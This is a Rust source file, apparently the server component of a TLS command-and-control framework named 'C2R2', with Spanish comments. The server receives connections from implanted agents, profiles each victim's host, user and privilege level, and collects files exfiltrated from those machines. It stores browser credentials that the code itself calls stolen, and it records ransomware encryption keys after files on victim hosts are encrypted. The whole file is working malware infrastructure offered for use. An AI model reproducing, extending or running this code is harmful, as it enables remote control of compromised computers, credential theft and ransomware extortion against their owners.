use chrono::Local;
use clap::Parser;
use colored::*;
use prettytable::{format, Cell, Row, Table};
use rustls::pki_types::CertificateDer;
use rustls::ServerConfig;
use rustyline::error::ReadlineError;
use rustyline::DefaultEditor;
use std::collections::HashMap;
use std::env;
use std::fs::{self, File};
use std::io::BufReader as StdBufReader;
use std::path::PathBuf;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::mpsc;
use tokio_rustls::server::TlsStream;
use tokio_rustls::TlsAcceptor;
use tracing::{debug, error, info, warn};
use tracing_appender::rolling::{RollingFileAppender, Rotation};
use tracing_subscriber::EnvFilter;

// API module for team client communication
mod api;
use api::{create_api_router, AgentInfo as ApiAgentInfo, ApiState, DirEntry as ApiDirEntry};

type ClientId = u64;

const DELIMITER: &str = "\n<<END>>\n";
const CERTS_DIR: &str = "certs";
const CERT_FILE: &str = "server.crt";
const KEY_FILE: &str = "server.key";

#[derive(Parser)]
#[command(name = "c2r2-server")]
#[command(about = "C2R2 Command & Control Server with TLS", long_about = None)]
struct Args {
    /// Dirección IP donde bindear (0.0.0.0 para todas las interfaces)
    #[arg(short, long, default_value = "0.0.0.0")]
    bind: String,

    /// Puerto donde escuchar conexiones TLS
    #[arg(short, long, default_value_t = 4444)]
    port: u16,

    /// Puerto para la API de Team Client (HTTP/WebSocket)
    #[arg(long = "api-port", default_value_t = 5555)]
    api_port: u16,

    /// Contraseña para la API de Team Client
    #[arg(long = "api-password", default_value = "c2r2-secret")]
    api_password: String,

    /// Modo verboso
    #[arg(short, long)]
    verbose: bool,

    /// Genera nuevos certificados TLS (auto-firmados)
    #[arg(long = "generate-certs")]
    generate_certs: bool,
}

// Información del cliente
#[derive(Clone)]
struct ClientInfo {
    id: ClientId,
    addr: String,
    hostname: Option<String>,
    username: Option<String>,
    os_version: Option<String>,
    privileges: Option<String>,
    connected_at: String,
}

impl ClientInfo {
    fn new(id: ClientId, addr: String) -> Self {
        Self {
            id,
            addr,
            hostname: None,
            username: None,
            os_version: None,
            privileges: None,
            connected_at: Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
        }
    }
}

// Estructura para manejar cada cliente
struct ClientHandle {
    id: ClientId,
    info: Arc<Mutex<ClientInfo>>,
    tx: mpsc::UnboundedSender<String>,
}

/// Obtiene la ruta al directorio modules/
/// Busca en:
/// 1. ./modules/ (si ejecutas desde c2r2-server/)
/// 2. ./c2r2-server/modules/ (si ejecutas desde raíz)
/// 3. <exe_dir>/modules/ (si ejecutas el binario)
fn get_modules_path() -> PathBuf {
    // Opción 1: modules/ en directorio actual
    let path1 = PathBuf::from("modules");
    if path1.exists() {
        return path1;
    }

    // Opción 2: c2r2-server/modules/ desde raíz
    let path2 = PathBuf::from("c2r2-server/modules");
    if path2.exists() {
        return path2;
    }

    // Opción 3: modules/ relativo al ejecutable
    if let Ok(exe) = env::current_exe() {
        if let Some(exe_dir) = exe.parent() {
            let path3 = exe_dir.join("modules");
            if path3.exists() {
                return path3;
            }
        }
    }

    // Fallback: modules/ en directorio actual (aunque no exista)
    PathBuf::from("modules")
}

/// Genera certificados TLS auto-firmados para el servidor
/// Esto crea un certificado válido para conexiones locales y la IP especificada
fn generate_self_signed_certs(bind_addr: &str) -> Result<(), String> {
    use rcgen::{generate_simple_self_signed, CertifiedKey};

    // Crear directorio de certificados
    fs::create_dir_all(CERTS_DIR)
        .map_err(|e| format!("Error creando directorio {}: {}", CERTS_DIR, e))?;

    // Generar nombres alternativos (SAN) para el certificado
    let mut subject_alt_names = vec!["localhost".to_string(), "127.0.0.1".to_string()];

    // Agregar la IP de bind si no es 0.0.0.0
    if bind_addr != "0.0.0.0" && !subject_alt_names.contains(&bind_addr.to_string()) {
        subject_alt_names.push(bind_addr.to_string());
    }

    println!(
        "{} Generando certificado para: {:?}",
        "🔐".bright_cyan(),
        subject_alt_names
    );

    // Generar certificado
    let CertifiedKey { cert, key_pair } = generate_simple_self_signed(subject_alt_names)
        .map_err(|e| format!("Error generando certificado: {}", e))?;

    // Guardar certificado
    let cert_path = PathBuf::from(CERTS_DIR).join(CERT_FILE);
    fs::write(&cert_path, cert.pem()).map_err(|e| format!("Error guardando certificado: {}", e))?;

    // Guardar clave privada
    let key_path = PathBuf::from(CERTS_DIR).join(KEY_FILE);
    fs::write(&key_path, key_pair.serialize_pem())
        .map_err(|e| format!("Error guardando clave privada: {}", e))?;

    println!(
        "{} Certificado guardado en: {}",
        "✅".bright_green(),
        cert_path.display()
    );
    println!(
        "{} Clave privada guardada en: {}",
        "✅".bright_green(),
        key_path.display()
    );

    Ok(())
}

/// Carga los certificados TLS desde el directorio de certificados
fn load_tls_config() -> Result<ServerConfig, String> {
    let cert_path = PathBuf::from(CERTS_DIR).join(CERT_FILE);
    let key_path = PathBuf::from(CERTS_DIR).join(KEY_FILE);

    // Verificar que existan los archivos
    if !cert_path.exists() || !key_path.exists() {
        return Err(format!(
            "Certificados TLS no encontrados. Ejecuta con --generate-certs primero.\n\
             Esperados:\n  - {}\n  - {}",
            cert_path.display(),
            key_path.display()
        ));
    }

    // Cargar certificados
    let cert_file =
        File::open(&cert_path).map_err(|e| format!("Error abriendo certificado: {}", e))?;
    let mut cert_reader = StdBufReader::new(cert_file);
    let certs: Vec<CertificateDer<'static>> = rustls_pemfile::certs(&mut cert_reader)
        .filter_map(|r| match r {
            Ok(cert) => Some(cert),
            Err(e) => {
                eprintln!("⚠️  Warning: Error parseando certificado: {}", e);
                None
            }
        })
        .collect();

    if certs.is_empty() {
        return Err("No se encontraron certificados válidos en el archivo".to_string());
    }

    // Cargar clave privada
    let key_file =
        File::open(&key_path).map_err(|e| format!("Error abriendo clave privada: {}", e))?;
    let mut key_reader = StdBufReader::new(key_file);
    let key = rustls_pemfile::private_key(&mut key_reader)
        .map_err(|e| format!("Error leyendo clave privada: {}", e))?
        .ok_or("No se encontró clave privada válida en el archivo")?;

    // Crear configuración TLS
    let config = ServerConfig::builder()
        .with_no_client_auth()
        .with_single_cert(certs, key)
        .map_err(|e| format!("Error configurando TLS: {}", e))?;

    Ok(config)
}

/// Parses a command line string respecting quotes (both single and double)
/// Similar to shell parsing but simplified for Windows cmd.exe
///
/// Examples:
/// - `dir "C:\Program Files"` -> ["dir", "C:\Program Files"]
/// - `dir 'C:\Program Files'` -> ["dir", "C:\Program Files"]
/// - `dir C:\Windows` -> ["dir", "C:\Windows"]
fn parse_command_line(line: &str) -> Vec<String> {
    let mut args = Vec::new();
    let mut current_arg = String::new();
    let mut in_double_quotes = false;
    let mut in_single_quotes = false;
    let mut chars = line.chars().peekable();

    while let Some(ch) = chars.next() {
        match ch {
            '"' if !in_single_quotes => {
                in_double_quotes = !in_double_quotes;
                // Don't include the quote character itself
            }
            '\'' if !in_double_quotes => {
                in_single_quotes = !in_single_quotes;
                // Don't include the quote character itself
            }
            ' ' | '\t' if !in_double_quotes && !in_single_quotes => {
                // Whitespace outside quotes: end current argument
                if !current_arg.is_empty() {
                    args.push(current_arg.clone());
                    current_arg.clear();
                }
            }
            _ => {
                // Regular character or whitespace inside quotes
                current_arg.push(ch);
            }
        }
    }

    // Add final argument if any
    if !current_arg.is_empty() {
        args.push(current_arg);
    }

    args
}

/// Reconstructs a command line from parsed arguments, adding quotes where needed
/// Arguments containing spaces or special characters will be quoted
fn reconstruct_command(args: &[String]) -> String {
    if args.is_empty() {
        return String::new();
    }

    let mut result = String::new();

    for (i, arg) in args.iter().enumerate() {
        if i > 0 {
            result.push(' ');
        }

        // Quote if argument contains spaces or is empty
        if arg.contains(' ') || arg.is_empty() {
            result.push('"');
            result.push_str(arg);
            result.push('"');
        } else {
            result.push_str(arg);
        }
    }

    result
}

// Maneja la comunicación con un cliente TLS
async fn handle_client(
    id: ClientId,
    stream: TlsStream<TcpStream>,
    addr: String,
    clients: Arc<Mutex<HashMap<ClientId, ClientHandle>>>,
    api_state: Arc<ApiState>,
    verbose: bool,
) {
    info!("Nueva conexión TLS: [{}] desde {}", id, addr);
    println!(
        "{} {} {} {} {}",
        "🔐".bright_green(),
        "Nuevo cliente TLS".bright_white().bold(),
        format!("[{}]", id).bright_cyan().bold(),
        format!("desde {}", addr).bright_white().dimmed(),
        "(encriptado)".bright_green().dimmed()
    );

    let (tx, mut rx) = mpsc::unbounded_channel::<String>();
    let client_info = Arc::new(Mutex::new(ClientInfo::new(id, addr.clone())));

    // Create API agent info
    let api_agent_info = ApiAgentInfo {
        id,
        addr: addr.clone(),
        hostname: None,
        username: None,
        os_version: None,
        privileges: None,
        connected_at: Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
        cwd: None,
    };

    // Register with API state
    api_state.add_agent(id, api_agent_info, tx.clone()).await;

    {
        let mut clients = clients.lock().unwrap();
        clients.insert(
            id,
            ClientHandle {
                id,
                info: client_info.clone(),
                tx,
            },
        );
    }

    // Split the TLS stream into reader and writer
    let (reader, mut writer) = tokio::io::split(stream);
    let mut reader = BufReader::new(reader);

    // Tarea para enviar comandos al cliente (sin keep-alive ping)
    let send_task = tokio::spawn(async move {
        loop {
            // Esperar comandos del canal
            match rx.recv().await {
                Some(cmd) => {
                    let message = format!("{}\n", cmd);
                    if let Err(e) = writer.write_all(message.as_bytes()).await {
                        if verbose {
                            eprintln!("{} Error enviando a [{}]: {}", "❌".bright_red(), id, e);
                        }
                        break;
                    }
                    if let Err(e) = writer.flush().await {
                        if verbose {
                            eprintln!("{} Error flush [{}]: {}", "❌".bright_red(), id, e);
                        }
                        break;
                    }
                }
                None => break, // Canal cerrado
            }
        }
    });

    // Shared effective ID - may change if agent is recognized as a reconnection
    let effective_id = Arc::new(AtomicU64::new(id));

    // Tarea para recibir respuestas del cliente
    let info = client_info.clone();
    let api_state_recv = api_state.clone();
    let clients_recv = clients.clone();
    let effective_id_recv = effective_id.clone();
    let recv_task = tokio::spawn(async move {
        let mut command_buffer = String::new();
        let mut id = id; // mutable local copy, updated on reconnection

        loop {
            let mut line = String::new();
            match reader.read_line(&mut line).await {
                Ok(0) => {
                    if verbose {
                        println!(
                            "{} Cliente {} desconectado",
                            "🔌".bright_red(),
                            format!("[{}]", id).bright_cyan()
                        );
                    }
                    return;
                }
                Ok(_) => {
                    // Si es sysinfo, procesar inmediatamente
                    if line.starts_with("__SYSINFO__:") {
                        // Formato: __SYSINFO__:tipo:valor
                        let parts: Vec<&str> = line.trim().splitn(3, ':').collect();
                        if parts.len() >= 3 {
                            let value = parts[2].to_string();
                            let sysinfo_type = parts[1].to_string();

                            // Extract reconnection info while holding the lock briefly
                            let reconnect_check = {
                                let mut info = info.lock().unwrap();
                                match sysinfo_type.as_str() {
                                    "hostname" => {
                                        info.hostname = Some(value.clone());
                                        None // hostname alone doesn't trigger reconnection check
                                    }
                                    "username" => {
                                        info.username = Some(value.clone());
                                        // Return hostname if available for reconnection check
                                        info.hostname.clone().map(|h| (h, value.clone()))
                                    }
                                    "os" => {
                                        info.os_version = Some(value.clone());
                                        None
                                    }
                                    "privileges" => {
                                        info.privileges = Some(value.clone());
                                        None
                                    }
                                    _ => None,
                                }
                            }; // MutexGuard dropped here

                            // Update API state (non-blocking spawn for simple updates)
                            match sysinfo_type.as_str() {
                                "hostname" => {
                                    let api_state = api_state_recv.clone();
                                    let value_clone = value.clone();
                                    tokio::spawn(async move {
                                        api_state
                                            .update_agent_info(id, |agent| {
                                                agent.hostname = Some(value_clone);
                                            })
                                            .await;
                                    });
                                    info!("[{}] SYSINFO hostname: {}", id, value);
                                    if verbose {
                                        println!(
                                            "{} {} hostname: {}",
                                            "📝".bright_green(),
                                            format!("[{}]", id).bright_cyan(),
                                            value.bright_white()
                                        );
                                    }
                                }
                                "username" => {
                                    {
                                        let api_state = api_state_recv.clone();
                                        let value_clone = value.clone();
                                        let agent_id = id;
                                        tokio::spawn(async move {
                                            api_state
                                                .update_agent_info(agent_id, |agent| {
                                                    agent.username = Some(value_clone);
                                                })
                                                .await;
                                        });
                                    }
                                    info!("[{}] SYSINFO username: {}", id, value);
                                    if verbose {
                                        println!(
                                            "{} {} username: {}",
                                            "📝".bright_green(),
                                            format!("[{}]", id).bright_cyan(),
                                            value.bright_white()
                                        );
                                    }

                                    // Check for reconnection
                                    if let Some((hostname, username)) = reconnect_check {
                                        let current_id = id;
                                        if let Some(old_id) = api_state_recv
                                            .check_reconnection(&hostname, &username)
                                            .await
                                        {
                                            if old_id != current_id {
                                                info!(
                                                    "Agent reconnected: [{}] -> [{}] ({}@{})",
                                                    current_id, old_id, username, hostname
                                                );
                                                println!(
                                                    "{} {} {} {}",
                                                    "🔄".bright_yellow(),
                                                    "Agent reconnected:".bright_white().bold(),
                                                    format!("[{}] → [{}]", current_id, old_id)
                                                        .bright_cyan()
                                                        .bold(),
                                                    format!("({}@{})", username, hostname)
                                                        .bright_white()
                                                );

                                                // Get the tx from current entry
                                                let tx_clone = {
                                                    let c = clients_recv.lock().unwrap();
                                                    c.get(&current_id).map(|h| h.tx.clone())
                                                };
                                                if let Some(tx) = tx_clone {
                                                    // Reassign in API state
                                                    api_state_recv
                                                        .reassign_agent_id(
                                                            current_id,
                                                            old_id,
                                                            tx.clone(),
                                                        )
                                                        .await;

                                                    // Reassign in clients HashMap
                                                    {
                                                        let mut c = clients_recv.lock().unwrap();
                                                        if let Some(mut handle) =
                                                            c.remove(&current_id)
                                                        {
                                                            handle.id = old_id;
                                                            {
                                                                let mut ci =
                                                                    handle.info.lock().unwrap();
                                                                ci.id = old_id;
                                                            }
                                                            c.insert(old_id, handle);
                                                        }
                                                    }

                                                    // Update the effective ID for cleanup
                                                    id = old_id;
                                                    effective_id_recv
                                                        .store(old_id, Ordering::SeqCst);
                                                }
                                            }
                                        }
                                    }
                                }
                                "os" => {
                                    let api_state = api_state_recv.clone();
                                    let value_clone = value.clone();
                                    tokio::spawn(async move {
                                        api_state
                                            .update_agent_info(id, |agent| {
                                                agent.os_version = Some(value_clone);
                                            })
                                            .await;
                                    });
                                    info!("[{}] SYSINFO OS: {}", id, value);
                                    if verbose {
                                        println!(
                                            "{} {} OS: {}",
                                            "📝".bright_green(),
                                            format!("[{}]", id).bright_cyan(),
                                            value.bright_white()
                                        );
                                    }
                                }
                                "privileges" => {
                                    let api_state = api_state_recv.clone();
                                    let value_clone = value.clone();
                                    tokio::spawn(async move {
                                        api_state
                                            .update_agent_info(id, |agent| {
                                                agent.privileges = Some(value_clone);
                                            })
                                            .await;
                                    });
                                    info!("[{}] SYSINFO privileges: {}", id, value);
                                    if verbose {
                                        let priv_colored = if value == "Admin" {
                                            value.bright_red().bold()
                                        } else {
                                            value.bright_yellow().bold()
                                        };
                                        println!(
                                            "{} {} privilegios: {}",
                                            "📝".bright_green(),
                                            format!("[{}]", id).bright_cyan(),
                                            priv_colored
                                        );
                                    }
                                }
                                _ => {}
                            }
                        }
                        continue;
                    }

                    // Para comandos, acumular hasta encontrar delimitador
                    command_buffer.push_str(&line);
                    if command_buffer.contains(DELIMITER) {
                        let response = command_buffer.replace(DELIMITER, "").trim().to_string();
                        if !response.is_empty() {
                            // Verificar si es una respuesta de file transfer
                            if response.starts_with("__FILE__:") {
                                info!("[{}] Recibiendo archivo descargado", id);
                                handle_file_download(&response, id, verbose);
                            } else if response.starts_with("__CREDENTIALS_B64__:") {
                                // Respuesta de /harvest con credenciales en Base64
                                let encoded =
                                    response.strip_prefix("__CREDENTIALS_B64__:").unwrap_or("");
                                info!("[{}] Recibiendo credenciales robadas (Base64)", id);
                                handle_credentials_harvest(encoded, id);
                            } else if response.starts_with("__RANSOMWARE__:") {
                                // Respuesta de /encrypt o /decrypt
                                let result = response.strip_prefix("__RANSOMWARE__:").unwrap_or("");
                                info!("[{}] Respuesta ransomware: {}", id, result);
                                handle_ransomware_response(result, id);
                            } else if response.starts_with("__ERROR__:") {
                                let error =
                                    response.strip_prefix("__ERROR__:").unwrap_or(&response);
                                error!("[{}] Error recibido: {}", id, error);
                                println!();
                                println!(
                                    "{} {} {}",
                                    "❌".bright_red(),
                                    "Error de".bright_white().bold(),
                                    format!("[{}]:", id).bright_cyan().bold()
                                );
                                println!("{}", "─".repeat(60).bright_black());
                                println!("{}", error.bright_red());
                                println!("{}", "─".repeat(60).bright_black());
                                println!();

                                // Broadcast to API clients
                                api_state_recv.broadcast_event(
                                    crate::api::ServerEvent::CommandOutput {
                                        agent_id: id,
                                        output: error.to_string(),
                                        is_error: true,
                                    },
                                );
                            } else if response.starts_with("__SUCCESS__:") {
                                let msg =
                                    response.strip_prefix("__SUCCESS__:").unwrap_or(&response);
                                info!("[{}] Éxito: {}", id, msg);
                                println!();
                                println!(
                                    "{} {} {}",
                                    "✅".bright_green(),
                                    "Éxito de".bright_white().bold(),
                                    format!("[{}]:", id).bright_cyan().bold()
                                );
                                println!("{}", "─".repeat(60).bright_black());
                                println!("{}", msg.bright_green());
                                println!("{}", "─".repeat(60).bright_black());
                                println!();

                                // Broadcast to API clients
                                api_state_recv.broadcast_event(
                                    crate::api::ServerEvent::CommandOutput {
                                        agent_id: id,
                                        output: msg.to_string(),
                                        is_error: false,
                                    },
                                );
                            } else if response.starts_with("__DELETED__:") {
                                // File/directory deleted response
                                let path =
                                    response.strip_prefix("__DELETED__:").unwrap_or(&response);
                                info!("[{}] Deleted: {}", id, path);
                                println!();
                                println!(
                                    "{} {} {}",
                                    "🗑️ ".bright_red(),
                                    "Deleted on".bright_white().bold(),
                                    format!("[{}]:", id).bright_cyan().bold()
                                );
                                println!("{}", "─".repeat(60).bright_black());
                                println!("{}", path.bright_red());
                                println!("{}", "─".repeat(60).bright_black());
                                println!();

                                // Broadcast to API clients
                                api_state_recv.broadcast_event(
                                    crate::api::ServerEvent::FileDeleted {
                                        agent_id: id,
                                        path: path.to_string(),
                                    },
                                );
                            } else if response.starts_with("__DIRLIST__:") {
                                // Directory listing response: __DIRLIST__:path:entries
                                let content = response.strip_prefix("__DIRLIST__:").unwrap_or("");
                                // Parse: first part is path (up to next colon), rest is entries
                                if let Some(colon_pos) = content.find(':') {
                                    let path = &content[..colon_pos];
                                    let entries_str = &content[colon_pos + 1..];

                                    info!("[{}] Directory listing: {}", id, path);

                                    // Parse entries
                                    let entries: Vec<crate::api::DirEntry> = entries_str
                                        .lines()
                                        .filter_map(|line| {
                                            let parts: Vec<&str> = line.split('|').collect();
                                            if parts.len() >= 3 {
                                                let is_dir = parts[0] == "D";
                                                let name = parts[1].to_string();
                                                let size = parts[2].parse::<u64>().unwrap_or(0);
                                                Some(crate::api::DirEntry { name, is_dir, size })
                                            } else {
                                                None
                                            }
                                        })
                                        .collect();

                                    // Update agent's cwd
                                    let api_state = api_state_recv.clone();
                                    let path_clone = path.to_string();
                                    tokio::spawn(async move {
                                        api_state
                                            .update_agent_info(id, |agent| {
                                                agent.cwd = Some(path_clone);
                                            })
                                            .await;
                                    });

                                    if verbose {
                                        println!(
                                            "{} {} {}",
                                            "📂".bright_cyan(),
                                            format!("[{}]", id).bright_cyan().bold(),
                                            format!(
                                                "Directory: {} ({} items)",
                                                path,
                                                entries.len()
                                            )
                                            .bright_white()
                                        );
                                    }

                                    // Broadcast directory listing to API clients
                                    api_state_recv.broadcast_event(
                                        crate::api::ServerEvent::DirectoryListing {
                                            agent_id: id,
                                            path: path.to_string(),
                                            entries,
                                        },
                                    );
                                }
                            } else if response.starts_with("__CWD__:") {
                                // Current working directory response
                                let cwd = response.strip_prefix("__CWD__:").unwrap_or("");
                                info!("[{}] CWD: {}", id, cwd);

                                // Update agent's cwd
                                let api_state = api_state_recv.clone();
                                let cwd_clone = cwd.to_string();
                                tokio::spawn(async move {
                                    api_state
                                        .update_agent_info(id, |agent| {
                                            agent.cwd = Some(cwd_clone);
                                        })
                                        .await;
                                });

                                if verbose {
                                    println!(
                                        "{} {} {}",
                                        "📁".bright_green(),
                                        format!("[{}]", id).bright_cyan().bold(),
                                        format!("CWD: {}", cwd).bright_white()
                                    );
                                }

                                // Broadcast cwd change to API clients
                                api_state_recv.broadcast_event(
                                    crate::api::ServerEvent::CwdChanged {
                                        agent_id: id,
                                        cwd: cwd.to_string(),
                                    },
                                );
                            } else if response.starts_with("__INFO__:") {
                                // Info message (like beacon config confirmation)
                                let msg = response.strip_prefix("__INFO__:").unwrap_or(&response);
                                info!("[{}] Info: {}", id, msg);
                                println!();
                                println!(
                                    "{} {} {}",
                                    "ℹ️ ".bright_cyan(),
                                    "Info from".bright_white().bold(),
                                    format!("[{}]:", id).bright_cyan().bold()
                                );
                                println!("{}", "─".repeat(60).bright_black());
                                println!("{}", msg.bright_cyan());
                                println!("{}", "─".repeat(60).bright_black());
                                println!();

                                // Broadcast to API clients
                                api_state_recv.broadcast_event(
                                    crate::api::ServerEvent::CommandOutput {
                                        agent_id: id,
                                        output: msg.to_string(),
                                        is_error: false,
                                    },
                                );
                            } else {
                                // Normal command response - LOG COMPLETE OUTPUT
                                info!("[{}] OUTPUT:\n{}", id, response);
                                debug!("[{}] Response received: {} bytes", id, response.len());
                                println!();
                                println!(
                                    "{} {} {}",
                                    "📨".bright_blue(),
                                    "Response from".bright_white().bold(),
                                    format!("[{}]:", id).bright_cyan().bold()
                                );
                                println!("{}", "─".repeat(60).bright_black());
                                println!("{}", response);
                                println!("{}", "─".repeat(60).bright_black());
                                println!();

                                // Broadcast to API clients
                                api_state_recv.broadcast_event(
                                    crate::api::ServerEvent::CommandOutput {
                                        agent_id: id,
                                        output: response.clone(),
                                        is_error: false,
                                    },
                                );
                            }
                        }
                        command_buffer.clear();
                    }
                }
                Err(e) => {
                    if verbose {
                        eprintln!("{} Error leyendo [{}]: {}", "⚠️ ".bright_yellow(), id, e);
                    }
                    return;
                }
            }
        }
    });

    // Esperar a que termine alguna tarea
    tokio::select! {
        _ = send_task => {},
        _ = recv_task => {},
    }

    // Limpiar cliente - use effective_id which may have been updated on reconnection
    let cleanup_id = effective_id.load(Ordering::SeqCst);
    clients.lock().unwrap().remove(&cleanup_id);
    api_state.remove_agent(cleanup_id).await;
    warn!("Cliente [{}] desconectado", cleanup_id);
    println!("❌ Cliente [{}] desconectado", cleanup_id);
}

fn handle_file_download(response: &str, client_id: ClientId, verbose: bool) {
    // Formato: __FILE__:nombre_archivo:tamaño:datos_base64
    let parts: Vec<&str> = response.splitn(4, ':').collect();

    if parts.len() != 4 {
        error!("[{}] Formato de archivo inválido en descarga", client_id);
        eprintln!("{} Formato de archivo inválido", "❌".bright_red());
        return;
    }

    let file_name = parts[1];
    let file_size = parts[2];
    let encoded_data = parts[3];

    if verbose {
        println!(
            "{} Decodificando {} bytes de base64...",
            "🔄".bright_yellow(),
            encoded_data.len()
        );
    }

    match base64_decode(encoded_data) {
        Ok(file_data) => {
            let save_path = format!("downloads/{}", file_name);

            // Crear directorio downloads si no existe
            if let Err(e) = fs::create_dir_all("downloads") {
                error!("[{}] Error creando directorio downloads: {}", client_id, e);
                eprintln!(
                    "{} Error creando directorio downloads: {}",
                    "❌".bright_red(),
                    e
                );
                return;
            }

            match fs::write(&save_path, file_data) {
                Ok(_) => {
                    info!(
                        "[{}] Archivo descargado: {} ({} bytes) -> {}",
                        client_id, file_name, file_size, save_path
                    );
                    println!();
                    println!(
                        "{}",
                        "╔═══════════════════════════════════════════════════════════╗"
                            .bright_green()
                    );
                    println!(
                        "{}",
                        format!("║              📥 ARCHIVO DESCARGADO [{}]", client_id)
                            .bright_green()
                            .bold()
                    );
                    println!(
                        "{}",
                        "╚═══════════════════════════════════════════════════════════╝"
                            .bright_green()
                    );
                    println!();
                    println!(
                        "  {} {}",
                        "📄 Archivo:".bright_cyan().bold(),
                        file_name.bright_white()
                    );
                    println!(
                        "  {} {}",
                        "📊 Tamaño:".bright_cyan().bold(),
                        format!("{} bytes", file_size).bright_white()
                    );
                    println!(
                        "  {} {}",
                        "💾 Guardado:".bright_cyan().bold(),
                        save_path.bright_white()
                    );
                    println!();
                }
                Err(e) => {
                    error!(
                        "[{}] Error guardando archivo '{}': {}",
                        client_id, save_path, e
                    );
                    eprintln!("{} Error guardando archivo: {}", "❌".bright_red(), e);
                }
            }
        }
        Err(e) => {
            error!("[{}] Error decodificando base64: {}", client_id, e);
            eprintln!("{} Error decodificando base64: {}", "❌".bright_red(), e);
        }
    }
}

/// Maneja la recepción de credenciales robadas en Base64
fn handle_credentials_harvest(encoded_data: &str, client_id: ClientId) {
    // Decodificar Base64
    match base64_decode(encoded_data) {
        Ok(decoded_bytes) => {
            // Convertir bytes a string UTF-8
            match String::from_utf8(decoded_bytes) {
                Ok(credentials_text) => {
                    // Crear directorio harvested si no existe
                    if let Err(e) = fs::create_dir_all("harvested") {
                        error!("[{}] Error creando directorio harvested: {}", client_id, e);
                        eprintln!(
                            "{} Error creando directorio harvested: {}",
                            "❌".bright_red(),
                            e
                        );
                        return;
                    }

                    // Nombre del archivo con timestamp
                    let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S");
                    let filename = format!("harvested/credentials_{}_{}.txt", client_id, timestamp);

                    // Guardar archivo
                    match fs::write(&filename, &credentials_text) {
                        Ok(_) => {
                            info!("[{}] Credenciales guardadas en: {}", client_id, filename);

                            // Mostrar en consola con formato bonito
                            println!();
                            println!(
                                "{}",
                                "╔═══════════════════════════════════════════════════════════╗"
                                    .bright_green()
                            );
                            println!(
                                "{}",
                                format!("║         🔑 CREDENCIALES OBTENIDAS [{}]", client_id)
                                    .bright_green()
                                    .bold()
                            );
                            println!(
                                "{}",
                                "╚═══════════════════════════════════════════════════════════╝"
                                    .bright_green()
                            );
                            println!();

                            // Contar credenciales (líneas que contienen "Browser:")
                            let cred_count = credentials_text
                                .lines()
                                .filter(|line| line.trim().starts_with("Browser:"))
                                .count();

                            println!(
                                "  {} {}",
                                "📊 Total:".bright_cyan().bold(),
                                format!("{} credenciales", cred_count).bright_white()
                            );
                            println!(
                                "  {} {}",
                                "💾 Guardado:".bright_cyan().bold(),
                                filename.bright_white()
                            );
                            println!(
                                "  {} {}",
                                "📄 Tamaño:".bright_cyan().bold(),
                                format!("{} bytes", credentials_text.len()).bright_white()
                            );
                            println!();
                            println!("{}", "─".repeat(60).bright_black());
                            println!("{}", credentials_text.bright_white());
                            println!("{}", "─".repeat(60).bright_black());
                            println!();
                        }
                        Err(e) => {
                            error!("[{}] Error guardando credenciales: {}", client_id, e);
                            eprintln!("{} Error guardando credenciales: {}", "❌".bright_red(), e);
                        }
                    }
                }
                Err(e) => {
                    error!(
                        "[{}] Error convirtiendo credenciales a UTF-8: {}",
                        client_id, e
                    );
                    eprintln!(
                        "{} Datos decodificados no son UTF-8 válido: {}",
                        "❌".bright_red(),
                        e
                    );
                }
            }
        }
        Err(e) => {
            error!("[{}] Error decodificando Base64: {}", client_id, e);
            eprintln!("{} Error decodificando Base64: {}", "❌".bright_red(), e);
        }
    }
}

fn handle_ransomware_response(result: &str, client_id: ClientId) {
    println!();
    println!(
        "{}",
        "╔═══════════════════════════════════════════════════════════╗".bright_yellow()
    );
    println!(
        "{}",
        format!("║           🔐 RANSOMWARE RESULT [{}]", client_id)
            .bright_yellow()
            .bold()
    );
    println!(
        "{}",
        "╚═══════════════════════════════════════════════════════════╝".bright_yellow()
    );
    println!();

    // Parsear resultado
    if result.starts_with("KEY:") {
        // Resultado de encriptación
        let parts: Vec<&str> = result.split(':').collect();
        if parts.len() >= 4 {
            let key = parts[1];
            let encrypted_count = parts[3];

            println!(
                "  {} {}",
                "✅ Encriptación completada".bright_green().bold(),
                "".bright_white()
            );
            println!(
                "  {} {}",
                "📁 Archivos encriptados:".bright_cyan().bold(),
                encrypted_count.bright_white()
            );
            println!();
            println!("{}", "─".repeat(60).bright_black());
            println!(
                "  {} {}",
                "🔑 CLAVE DE DESENCRIPTACIÓN:".bright_red().bold(),
                "".bright_white()
            );
            println!("  {}", key.bright_yellow());
            println!("{}", "─".repeat(60).bright_black());
            println!();
            println!(
                "{}",
                "  ⚠️  GUARDA ESTA CLAVE - Es la única forma de recuperar los archivos"
                    .bright_red()
                    .bold()
            );
            println!();

            // Guardar clave en archivo
            let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S");
            let filename = format!("harvested/ransomware_key_{}_{}.txt", client_id, timestamp);
            if let Ok(_) = fs::write(
                &filename,
                format!(
                    "Client: {}\nTimestamp: {}\nKey: {}\n",
                    client_id, timestamp, key
                ),
            ) {
                println!(
                    "  {} {}",
                    "💾 Clave guardada en:".bright_cyan().bold(),
                    filename.bright_white()
                );
            }
        }
    } else if result.starts_with("OK:") {
        // Resultado de desencriptación
        let msg = result.strip_prefix("OK:").unwrap_or(result);
        println!("  {} {}", "✅".bright_green(), msg.bright_white());
    } else {
        // Otro resultado
        println!("  {}", result.bright_white());
    }

    println!();
}

fn base64_decode(data: &str) -> Result<Vec<u8>, String> {
    let data = data.trim();
    let mut result = Vec::new();

    let decode_char = |c: char| -> Result<u8, String> {
        match c {
            'A'..='Z' => Ok(c as u8 - b'A'),
            'a'..='z' => Ok(c as u8 - b'a' + 26),
            '0'..='9' => Ok(c as u8 - b'0' + 52),
            '+' => Ok(62),
            '/' => Ok(63),
            '=' => Ok(0),
            _ => Err(format!("Carácter inválido en base64: {}", c)),
        }
    };

    let chars: Vec<char> = data.chars().collect();
    for chunk in chars.chunks(4) {
        if chunk.len() != 4 {
            continue;
        }

        let b1 = decode_char(chunk[0])?;
        let b2 = decode_char(chunk[1])?;
        let b3 = decode_char(chunk[2])?;
        let b4 = decode_char(chunk[3])?;

        result.push((b1 << 2) | (b2 >> 4));
        if chunk[2] != '=' {
            result.push((b2 << 4) | (b3 >> 2));
        }
        if chunk[3] != '=' {
            result.push((b3 << 6) | b4);
        }
    }

    Ok(result)
}

